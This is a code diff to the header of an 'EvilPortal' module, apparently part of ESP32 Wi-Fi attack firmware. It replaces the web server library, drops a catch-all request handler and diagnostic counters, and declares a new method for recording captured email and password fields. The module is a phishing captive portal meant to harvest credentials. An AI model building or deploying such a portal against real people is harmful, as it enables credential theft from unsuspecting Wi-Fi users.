@@ -3,8 +3,7 @@
 #ifndef EvilPortal_h
 #define EvilPortal_h
 
-#include "ESPAsyncWebServer.h"
-#include <AsyncTCP.h>
+#include <esp_http_server.h>
 #include <DNSServer.h>
 #include <WiFi.h>
 
@@ -68,18 +67,6 @@ struct AccessPoint {
   uint32_t last_seen_ms;
 };
 
-class CaptiveRequestHandler : public AsyncWebHandler {
-public:
-  CaptiveRequestHandler() {}
-  virtual ~CaptiveRequestHandler() {}
-
-  bool canHandle(AsyncWebServerRequest *request) { return true; }
-
-  void handleRequest(AsyncWebServerRequest *request) {
-    request->send(200, "text/html", index_html ? index_html : "");
-  }
-};
-
 class EvilPortal {
 
   private:
@@ -112,13 +99,6 @@ class EvilPortal {
     bool using_serial_html;
     bool has_ap;
 
-    // Diagnostics: count HTTP requests the portal actually receives (bumped from
-    // the async web-server callbacks) and the last count surfaced on screen, so
-    // main() can report "did the phone's request reach us" without writing to
-    // the display from the async task.
-    volatile uint32_t http_hits = 0;
-    uint32_t http_hits_shown = 0;
-
     LinkedList<String>* html_files;
 
     void cleanup();
@@ -130,6 +110,10 @@ class EvilPortal {
     bool begin(LinkedList<ssid>* ssids, LinkedList<AccessPoint>* access_points);
     void main(uint8_t scan_mode);
     void setHtmlFromSerial();
+    // Called from the esp_http_server "/get" handler (httpd task context) to
+    // record a captured credential field; main() prints/logs it on the next
+    // pass once both fields have arrived.
+    void onCredentialField(bool is_email, const String& value);
 
 };
 
